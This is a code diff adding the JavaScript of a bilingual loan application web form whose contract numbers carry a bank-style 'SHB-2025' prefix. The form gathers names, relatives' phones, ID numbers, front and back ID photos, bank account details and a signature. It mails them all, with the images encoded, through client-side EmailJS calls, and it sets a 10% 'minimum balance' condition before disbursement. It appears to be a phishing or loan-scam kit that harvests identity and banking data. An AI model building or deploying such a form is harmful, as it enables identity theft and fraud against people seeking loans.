+                accountNumber: "Account Number",
+                accountHolder: "Account Holder",
+                bank: "Bank",
+                branchName: "Branch Name",
+                idPhotoFront: "Front ID Photo",
+                idPhotoBack: "Back ID Photo",
+                signature: "Signature",
+                signatureInstruction: "Please click 'Start Signing' and draw your signature in the box below.",
+                startSigning: "Start Signing",
+                clearSignature: "Clear Signature",
+                contractNumber: "Contract Number",
+                contractDate: "Contract Date",
+                minimumBalance: "Minimum Balance",
+                disbursementConditions: "Disbursement Conditions",
+                disbursementDate: "Expected Disbursement Date",
+                staff: "Responsible Staff",
+                successModalTitle: "Application Submitted Successfully",
+                successMessage: "Your loan application has been submitted successfully!",
+                checkEmail: "Please check your email for the contract and disbursement conditions.",
+                prev: "Back",
+                next: "Next",
+                delete: "Delete",
+                submitForm: "Submit Application",
+                close: "Close",
+                selectLoanTerm: "Select Term",
+                selectLoanType: "Select Loan Type",
+                personalLoanOnline: "Personal Loan Online",
+                homeLoan: "Home Loan",
+                carLoan: "Car Loan",
+                consumerLoan: "Consumer Loan",
+                step1Instruction: "Please fill in your personal information accurately to proceed.",
+                step2Instruction: "Please provide accurate ID information.",
+                step3Instruction: "Please select the loan amount and type that suits you.",
+                step4Instruction: "Please provide bank account information for disbursement.",
+                step5Instruction: "Please upload the required documents and sign the contract.",
+                step6Instruction: "Review the contract and disbursement conditions before submitting.",
+                invalidImage: "Please upload a valid image file (JPG, PNG, etc.).",
+                imageTooLarge: "Image must not exceed 5MB!",
+                imageReadError: "Error reading image file. Please try again.",
+                selectImage: "Please select an image file.",
+                signContract: "Please sign the contract before proceeding.",
+                checkInformation: "Please review the information.",
+                pdfError: "Error generating PDF.",
+                submitError: "Error submitting application",
+                required: "is required",
+                uploadImage: "Please upload an image",
+                perYear: "per year"
+            }
+        };
+
+        class LoanForm {
+            constructor() {
+                this.formData = JSON.parse(localStorage.getItem('loanFormData')) || {};
+                this.currentStep = 1;
+                this.signatureData = null;
+                this.currentLanguage = localStorage.getItem('language') || 'vi';
+                this.loanInterestRates = {
+                    "Vay Cá Nhân Trực Tuyến": 12.0,
+                    "Vay mua nhà": 7.0,
+                    "Vay mua xe": 8.0,
+                    "Vay Tiêu Dùng": 12.0
+                };
+            }
+
+            init() {
+                emailjs.init("YOUR_PUBLIC_KEY"); // Thay YOUR_PUBLIC_KEY bằng key EmailJS của bạn
+                this.bindEvents();
+                this.loadFormData();
+                $('#registerForm').modal('show');
+                this.changeLanguage(this.currentLanguage);
+            }
+
+            changeLanguage(lang) {
+                this.currentLanguage = lang;
+                localStorage.setItem('language', lang);
+                $('[data-lang-key]').each((_, el) => {
+                    const key = $(el).data('lang-key');
+                    const translation = translations[lang][key] || $(el).text();
+                    if ($(el).is('input') || $(el).is('select')) {
+                        $(el).attr('placeholder', translation);
+                    } else if ($(el).is('option')) {
+                        $(el).text(translation);
+                    } else {
+                        $(el).text(translation);
+                    }
+                });
+                this.updateContractDetails();
+            }
+
+            bindEvents() {
+                $('#languageSelect').on('change', (e) => this.changeLanguage(e.target.value));
+                $('#loanType').on('change', () => this.updateInterestRate());
+                $('#loanAmount, #loanTerm').on('input change', () => this.calculateMonthlyPayment());
+                $('#loanAmount').on('input', this.debounce(this.formatCurrency, 300));
+            }
+
+            debounce(fn, wait) {
+                let timeout;
+                return function (...args) {
+                    clearTimeout(timeout);
+                    timeout = setTimeout(() => fn.apply(this, args), wait);
+                }.bind(this);
+            }
+
+            showToast(message, type = 'error') {
+                const toast = $('#toast');
+                toast.text(message).css('background', type === 'success' ? '#28a745' : '#e63946').fadeIn(300);
+                setTimeout(() => toast.fadeOut(300), 3000);
+            }
+
+            showLoading(show) {
+                $('#loadingOverlay').toggleClass('active', show);
+            }
+
+            formatCurrency(input) {
+                let value = input.value.replace(/\D/g, '');
+                input.value = value ? parseInt(value).toLocaleString('vi-VN') + ' VND' : '';
+                this.formData.loanAmount = input.value;
+                this.calculateMonthlyPayment();
+            }
+
+            parseCurrency(value) {
+                return parseInt(value.replace(/\D/g, '')) || 0;
+            }
+
+            calculateMonthlyPayment() {
+                const loanAmount = this.parseCurrency(this.formData.loanAmount || '0');
+                const loanTerm = parseInt(this.formData.loanTerm || 0);
+                const interestRate = parseFloat(this.formData.interestRate || 0) / 100 / 12;
+                if (loanAmount && loanTerm && interestRate) {
+                    const monthlyPayment = (interestRate * loanAmount) / (1 - Math.pow(1 + interestRate, -loanTerm));
+                    $('#monthlyPayment').text(monthlyPayment.toFixed(2).toLocaleString('vi-VN') + ' VND');
+                    this.formData.monthlyPayment = monthlyPayment.toFixed(2).toLocaleString('vi-VN') + ' VND';
+                } else {
+                    $('#monthlyPayment').text('0 VND');
+                    this.formData.monthlyPayment = '0 VND';
+                }
+            }
+
+            updateInterestRate() {
+                const loanType = $('#loanType').val();
+                this.formData.loanType = loanType;
+                this.formData.interestRate = this.loanInterestRates[loanType] || 12.0;
+                $('#interestRate').text(this.formData.interestRate + '% ' + (translations[this.currentLanguage].perYear || 'mỗi năm'));
+                this.calculateMonthlyPayment();
+            }
+
+            updateProgressBar(step) {
+                $('.progress-step').removeClass('active');
+                $(`.progress-step[data-step="${step}"]`).addClass('active');
+            }
+
+            previewImage(input, previewId, uploadedId) {
+                const file = input.files[0];
+                if (file) {
+                    if (!file.type.startsWith('image/')) {
+                        this.showToast(translations[this.currentLanguage].invalidImage, 'error');
+                        input.value = '';
+                        return;
+                    }
+                    if (file.size > 5 * 1000000) {
+                        this.showToast(translations[this.currentLanguage].imageTooLarge, 'error');
+                        input.value = '';
+                        return;
+                    }
+                    this.formData[input.name] = file;
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        $(`#${previewId}`).attr('src', e.target.result).show();
+                        $(`#${uploadedId}`).show();
+                    };
+                    reader.onerror = () => {
+                        this.showToast(translations[this.currentLanguage].imageReadError, 'error');
+                        input.value = '';
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    this.showToast(translations[this.currentLanguage].selectImage, 'error');
+                }
+            }
+
+            deletePhoto(inputName) {
+                this.formData[inputName] = null;
+                $(`#${inputName}Uploaded`).hide();
+                $(`input[name="${inputName}"]`).val('');
+            }
+
+            nextStep(step) {
+                const currentStepEl = $(`#step-${step - 1}`);
+                const inputs = currentStepEl.find('input[required], select[required]');
+                let isValid = true;
+
+                inputs.each((_, input) => {
+                    const $input = $(input);
+                    const value = $input.val();
+                    this.formData[$input.attr('name')] = value;
+                    if (!value) {
+                        isValid = false;
+                        $(`#${$input.attr('id')}Error`).text(`${translations[this.currentLanguage][$input.attr('name')]} ${translations[this.currentLanguage].required}`).show();
+                    } else if ($input.attr('pattern') && !new RegExp($input.attr('pattern')).test(value)) {
+                        isValid = false;
+                        $(`#${$input.attr('id')}Error`).text($input.attr('title')).show();
+                    } else if ($input.attr('type') === 'file' && !this.formData[$input.attr('name')]) {
+                        isValid = false;
+                        $(`#${$input.attr('id')}Error`).text(translations[this.currentLanguage].uploadImage).show();
+                    } else {
+                        $(`#${$input.attr('id')}Error`).hide();
+                    }
+                });
+
+                if (step === 6 && !this.signatureData) {
+                    isValid = false;
+                    this.showToast(translations[this.currentLanguage].signContract, 'error');
+                }
+
+                if (isValid) {
+                    this.updateProgressBar(step);
+                    $('.step').removeClass('active');
+                    $(`#step-${step}`).addClass('active');
+                    this.currentStep = step;
+                    if (step === 6) {
+                        this.updateContractDetails();
+                    }
+                    this.saveFormData();
+                } else {
+                    this.showToast(translations[this.currentLanguage].checkInformation, 'error');
+                }
+            }
+
+            prevStep(step) {
+                this.updateProgressBar(step);
+                $('.step').removeClass('active');
+                $(`#step-${step}`).addClass('active');
+                this.currentStep = step;
+            }
+
+            async submitForm() {
+                try {
+                    this.showLoading(true);
+                    const contractId = Math.floor(100000 + Math.random() * 900000);
+                    const contractNumber = `SHB-2025-${contractId}`;
+                    const contractUrl = await this.generateContractUrl();
+                    const disbursementUrl = await this.generateDisbursementUrl();
+
+                    const params = {
+                        fullName: this.formData.fullName || '',
+                        phone: this.formData.phone || '',
+                        relativePhone: this.formData.relativePhone || '',
+                        email: this.formData.email || '',
+                        idNumber: this.formData.idNumber || '',
+                        idIssueDate: this.formData.idIssueDate || '',
+                        idIssuePlace: this.formData.idIssuePlace || '',
+                        loanAmount: this.parseCurrency(this.formData.loanAmount || '0').toLocaleString('vi-VN'),
+                        loanTerm: this.formData.loanTerm || '',
+                        loanType: this.formData.loanType || '',
+                        loanPurpose: this.formData.loanPurpose || '',
+                        accountNumber: this.formData.accountNumber || '',
+                        accountHolder: this.formData.accountHolder || '',
+                        bank: this.formData.bank || '',
+                        branchName: this.formData.branchName || '',
+                        staffName: 'Nguyễn Văn A',
+                        staffPhone: '0901234567',
+                        interestRate: this.formData.interestRate || '',
+                        monthlyPayment: this.formData.monthlyPayment || '',
+                        disbursementDate: new Date().toLocaleDateString('vi-VN'),
+                        contractId,
+                        contractNumber,
+                        contractUrl,
+                        disbursementUrl,
+                        idPhotoFront: await this.toBase64(this.formData.idPhotoFront) || '',
+                        idPhotoBack: await this.toBase64(this.formData.idPhotoBack) || '',
+                        signature: this.signatureData || ''
+                    };
+
+                    await emailjs.send('service_db2prre', 'template_sgzr5e8', params); // Cần thay service và template ID
+                    await emailjs.send('service_db2prre', 'template_g4jo6tc', params);
+                    this.showToast(translations[this.currentLanguage].successMessage, 'success');
+
+                    $('#registerForm').modal('hide');
+                    $('#successModal').modal('show');
+                    $('#successLoanAmount').text(this.parseCurrency(this.formData.loanAmount || '0').toLocaleString('vi-VN') + ' VND');
+                    localStorage.removeItem('loanFormData'); // Xóa dữ liệu sau khi gửi
+                } catch (error) {
+                    console.error('Submit error:', error);
+                    this.showToast(`${translations[this.currentLanguage].submitError}: ${error.message}`, 'error');
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
+            async toBase64(file) {
+                if (!file) return '';
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.onerror = () => {
+                        this.showToast(translations[this.currentLanguage].imageReadError, 'error');
+                        reject(new Error('Failed to read file'));
+                    };
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            updateContractDetails() {
+                const contractId = Math.floor(100000 + Math.random() * 900000);
+                const contractNumber = `SHB-2025-${contractId}`;
+                const today = new Date().toLocaleDateString('vi-VN');
+                $('#contractId').text(contractId);
+                $('#contractDate').text(today);
+                $('#contractFullName').text(this.formData.fullName || '');
+                $('#contractIdNumber').text(this.formData.idNumber || '');
+                $('#contractPhone').text(this.formData.phone || '');
+                $('#contractEmail').text(this.formData.email || '');
+                $('#contractAccountNumber').text(this.formData.accountNumber || '');
+                $('#contractLoanAmount').text(this.parseCurrency(this.formData.loanAmount || '0').toLocaleString('vi-VN') + ' VND');
+                $('#contractLoanTerm').text(this.formData.loanTerm || '');
+                $('#disbursementMinimumBalance').text((this.parseCurrency(this.formData.loanAmount || '0') * 0.1).toLocaleString('vi-VN') + ' VND');
+                $('#disbursementDate').text(today);
+                new QRCode(document.getElementById('contractQrCode'), {
+                    text: `https://example.com/track-loan/SHB-2025-${contractId}`,
+                    width: 100,
+                    height: 100
+                });
+            }
+
+            async generateContractUrl() {
+                try {
+                    const element = document.createElement('div');
+                    element.innerHTML = `
+                        <h6>${translations[this.currentLanguage].contractNumber}: SHB-2025-${$('#contractId').text()}</h6>
+                        <p>${translations[this.currentLanguage].fullName}: ${$('#contractFullName').text()}</p>
+                        <p>${translations[this.currentLanguage].loanAmount}: ${$('#contractLoanAmount').text()}</p>
+                        <p>${translations[this.currentLanguage].loanTerm}: ${$('#contractLoanTerm').text()} tháng</p>
+                        <img src="${this.signatureData || 'https://via.placeholder.com/80x50'}" style="max-width: 200px;" alt="${translations[this.currentLanguage].signature}">
+                    `;
+                    const blob = await html2pdf().from(element).set({
+                        filename: `Contract_${this.formData.fullName || 'Unknown'}.pdf`,
+                        margin: 10,
+                        jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+                    }).output('blob');
+                    return URL.createObjectURL(blob);
+                } catch (error) {
+                    this.showToast(translations[this.currentLanguage].pdfError, 'error');
+                    throw error;
+                }
+            }
+
+            async generateDisbursementUrl() {
+                try {
+                    const element = document.createElement('div');
+                    element.innerHTML = `
+                        <h6>${translations[this.currentLanguage].disbursementConditions}</h6>
+                        <p>${translations[this.currentLanguage].fullName}: ${$('#contractFullName').text()}</p>
+                        <p>${translations[this.currentLanguage].minimumBalance}: ${$('#disbursementMinimumBalance').text()}</p>
+                    `;
+                    const blob = await html2pdf().from(element).set({
+                        filename: `Disbursement_${this.formData.fullName || 'Unknown'}.pdf`,
+                        margin: 10,
+                        jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+                    }).output('blob');
+                    return URL.createObjectURL(blob);
+                } catch (error) {
+                    this.showToast(translations[this.currentLanguage].pdfError, 'error');
+                    throw error;
+                }
+            }
+
+            startSigning() {
+                const canvas = document.getElementById('signatureCanvas');
+                const ctx = canvas.getContext('2d');
+                let isDrawing = false;
+
+                canvas.style.display = 'block';
+                $('#startSigning').hide();
+
+                canvas.addEventListener('mousedown', (e) => {
+                    isDrawing = true;
+                    ctx.beginPath();
+                    ctx.moveTo(e.offsetX, e.offsetY);
+                });
+
+                canvas.addEventListener('mousemove', (e) => {
+                    if (isDrawing) {
+                        ctx.lineTo(e.offsetX, e.offsetY);
+                        ctx.strokeStyle = '#000';
+                        ctx.lineWidth = 2;
+                        ctx.stroke();
+                    }
+                });
+
+                canvas.addEventListener('mouseup', () => {
+                    isDrawing = false;
+                    this.signatureData = canvas.toDataURL('image/png');
+                    $('#signaturePreview').attr('src', this.signatureData).show();
+                    $('#clearSignature').show();
+                    $('#contractNext').prop('disabled', false);
+                });
+
+                canvas.addEventListener('touchstart', (e) => {
+                    isDrawing = true;
+                    const touch = e.touches[0];
+                    const rect = canvas.getBoundingClientRect();
+                    ctx.beginPath();
+                    ctx.moveTo(touch.clientX - rect.left, touch.clientY - rect.top);
+                    e.preventDefault();
+                });
+
+                canvas.addEventListener('touchmove', (e) => {
+                    if (isDrawing) {
+                        const touch = e.touches[0];
+                        const rect = canvas.getBoundingClientRect();
+                        ctx.lineTo(touch.clientX - rect.left, touch.clientY - rect.top);
+                        ctx.strokeStyle = '#000';
+                        ctx.lineWidth = 2;
+                        ctx.stroke();
+                    }
+                    e.preventDefault();
+                });
+
+                canvas.addEventListener('touchend', () => {
+                    isDrawing = false;
+                    this.signatureData = canvas.toDataURL('image/png');
+                    $('#signaturePreview').attr('src', this.signatureData).show();
+                    $('#clearSignature').show();
+                    $('#contractNext').prop('disabled', false);
+                });
+            }
+
+            clearSignature() {
+                const canvas = document.getElementById('signatureCanvas');
+                const ctx = canvas.getContext('2d');
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                this.signatureData = null;
+                $('#signaturePreview').hide();
+                $('#clearSignature').hide();
+                $('#signatureCanvas').hide();
+                $('#startSigning').show();
+                $('#contractNext').prop('disabled', true);
+            }
+
+            saveFormData() {
+                localStorage.setItem('loanFormData', JSON.stringify(this.formData));
+            }
+
+            loadFormData() {
+                Object.keys(this.formData).forEach(key => {
+                    const $input = $(`[name="${key}"]`);
+                    if ($input.is('input[type="file"]')) return;
+                    $input.val(this.formData[key]);
+                });
+                this.calculateMonthlyPayment();
+            }
+        }
+
+        const loanForm = new LoanForm();
+        loanForm.init();
+    </script>
+</body>
+</html>
